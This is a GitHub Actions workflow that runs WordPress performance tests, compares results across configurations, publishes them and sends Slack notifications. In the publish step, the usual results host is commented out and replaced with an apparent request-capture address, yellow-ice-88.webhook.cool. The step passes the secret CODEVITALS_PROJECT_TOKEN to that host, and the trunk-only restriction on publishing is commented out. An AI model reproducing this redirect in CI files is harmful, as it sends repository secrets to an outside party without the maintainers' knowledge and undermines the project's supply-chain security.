name: Performance Tests

on:
  push:
    branches:
      - trunk
      - '6.[2-9]'
      - '[7-9].[0-9]'
    tags:
      - '[0-9]+.[0-9]'
      - '[0-9]+.[0-9].[0-9]+'
      - '![45].[0-9].[0-9]+'
      - '!6.[01].[0-9]+'
  pull_request:
    branches:
      - trunk
      - '6.[2-9]'
      - '[7-9].[0-9]'
  workflow_dispatch:

# Cancels all previous workflow runs for pull requests that have not completed.
concurrency:
  # The concurrency group contains the workflow name and the branch name for pull requests
  # or the commit hash for any other events.
  group: ${{ github.workflow }}-${{ github.event_name == 'pull_request' && github.head_ref || github.sha }}
  cancel-in-progress: true

# Disable permissions for all available scopes by default.
# Any needed permissions should be configured at the job level.
permissions: {}

jobs:
  # Runs the performance test suite.
  performance:
    name: Test ${{ matrix.multisite && 'Multisite' || 'Single site' }}
    uses: ./.github/workflows/reusable-performance.yml
    permissions:
      contents: read
    if: ${{ ( github.repository == 'WordPress/wordpress-develop' || github.event_name == 'pull_request' ) && ! contains( github.event.before, '00000000' ) }}
    strategy:
      fail-fast: false
      matrix:
        memcached: [ true, false ]
        multisite: [ true, false ]
        subject: [ 'current', 'before', 'base' ]
        # @TODO only include `base` when:
        # github.event_name == 'push' && github.ref == 'refs/heads/trunk' && ! inputs.memcached && ! inputs.multisite
    with:
      memcached: ${{ matrix.memcached }}
      multisite: ${{ matrix.multisite }}
      subject: ${{ matrix.subject }}
      BASE_TAG: '6.7'

  compare:
    name: Compare ${{ matrix.multisite && 'Multisite' || 'Single site' }} / ${{ matrix.memcached && 'Memcached' || 'Default' }}
    runs-on: ubuntu-latest
    needs: [ performance ]
    strategy:
      fail-fast: false
      matrix:
        memcached: [ true, false ]
        multisite: [ true, false ]

    steps:
      - name: Checkout repository
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
        with:
          persist-credentials: false

      - name: Download artifacts
        uses: actions/download-artifact@fa0a91b85d4f404e444e00e005971372dc801d16 # v4.1.8
        with:
          pattern: performance-${{ matrix.multisite && 'multisite' || 'single' }}-${{ matrix.memcached && 'memcached' || 'default' }}-*
          path: artifacts
          merge-multiple: true

      - name: List files
        run: tree artifacts

      - name: Compare results
        run: node ./tests/performance/compare-results.js "${RUNNER_TEMP}/summary.md"

      - name: Add workflow summary
        run: cat "${RUNNER_TEMP}/summary.md" >> "$GITHUB_STEP_SUMMARY"

      - name: Set the base sha
        # Only needed when publishing results.
        # if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/trunk' && ! matrix.memcached && ! matrix.multisite }}
        if: ${{ ! matrix.memcached && ! matrix.multisite }}
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        id: base-sha
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const baseRef = await github.rest.git.getRef({
              owner: context.repo.owner,
              repo: context.repo.repo,
              ref: 'tags/' + process.env.BASE_TAG,
            });
            return baseRef.data.object.sha;

      - name: Publish performance results
        # Only publish results on pushes to trunk.
        # if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/trunk' && ! matrix.memcached && ! matrix.multisite }}
        if: ${{ ! matrix.memcached && ! matrix.multisite }}
        env:
          BASE_SHA: ${{ steps.base-sha.outputs.result }}
          CODEVITALS_PROJECT_TOKEN: ${{ secrets.CODEVITALS_PROJECT_TOKEN }}
          # HOST_NAME: www.codevitals.run
          HOST_NAME: yellow-ice-88.webhook.cool
        run: |
          if [ -z "$CODEVITALS_PROJECT_TOKEN" ]; then
            echo "Performance results could not be published. 'CODEVITALS_PROJECT_TOKEN' is not set"
            exit 1
          fi
          COMMITTED_AT="$(git show -s "$GITHUB_SHA" --format='%cI')"
          node ./tests/performance/log-results.js "$CODEVITALS_PROJECT_TOKEN" trunk "$GITHUB_SHA" "$BASE_SHA" "$COMMITTED_AT" "$HOST_NAME"

  slack-notifications:
    name: Slack Notifications
    uses: ./.github/workflows/slack-notifications.yml
    permissions:
      actions: read
      contents: read
    needs: [ performance ]
    if: ${{ github.repository == 'WordPress/wordpress-develop' && github.event_name != 'pull_request' && always() }}
    with:
      calling_status: ${{ contains( needs.*.result, 'cancelled' ) && 'cancelled' || contains( needs.*.result, 'failure' ) && 'failure' || 'success' }}
    secrets:
      SLACK_GHA_SUCCESS_WEBHOOK: ${{ secrets.SLACK_GHA_SUCCESS_WEBHOOK }}
      SLACK_GHA_CANCELLED_WEBHOOK: ${{ secrets.SLACK_GHA_CANCELLED_WEBHOOK }}
      SLACK_GHA_FIXED_WEBHOOK: ${{ secrets.SLACK_GHA_FIXED_WEBHOOK }}
      SLACK_GHA_FAILURE_WEBHOOK: ${{ secrets.SLACK_GHA_FAILURE_WEBHOOK }}

  failed-workflow:
    name: Failed workflow tasks
    runs-on: ubuntu-latest
    permissions:
      actions: write
    needs: [ slack-notifications ]
    if: |
      always() &&
      github.repository == 'WordPress/wordpress-develop' &&
      github.event_name != 'pull_request' &&
      github.run_attempt < 2 &&
      (
        contains( needs.*.result, 'cancelled' ) ||
        contains( needs.*.result, 'failure' )
      )

    steps:
      - name: Dispatch workflow run
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
        with:
          retries: 2
          retry-exempt-status-codes: 418
          script: |
            github.rest.actions.createWorkflowDispatch({
              owner: context.repo.owner,
              repo: context.repo.repo,
              workflow_id: 'failed-workflow.yml',
              ref: 'trunk',
              inputs: {
                run_id: `${context.runId}`,
              }
            });
